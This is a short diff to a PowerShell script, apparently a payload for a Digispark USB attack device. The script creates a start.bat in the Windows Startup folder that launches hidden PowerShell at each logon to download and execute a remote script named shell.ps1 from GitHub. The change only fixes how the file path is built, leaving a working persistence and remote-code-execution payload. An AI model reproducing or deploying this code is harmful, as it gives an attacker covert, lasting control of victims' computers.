@@ -1,3 +1,5 @@
-$arquivo = New-Item -Path '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat' -ItemType "file"
-$dir = $HOME+$arquivo
-"powershell.exe -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/izaelbm/Digispark/main/shell.ps1')" > $dir
+$dir = $HOME+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat'
+
+$file = New-Item -Path $dir -ItemType "file"
+
+"powershell.exe -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/izaelbm/Digispark/main/shell.ps1')" > $file
